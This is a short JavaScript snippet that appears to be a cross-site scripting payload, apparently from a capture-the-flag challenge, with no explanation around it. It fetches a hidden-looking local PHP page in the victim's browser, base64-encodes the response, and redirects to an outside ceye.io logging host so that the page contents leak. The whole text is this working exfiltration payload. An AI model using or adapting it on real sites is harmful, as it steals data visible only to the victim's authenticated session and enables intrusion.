xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://0740e2.ceye.io/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open('GET','query_aIeMu0FUoVrW0NWPHbN6z4xh.php',true);
xmlhttp.send();
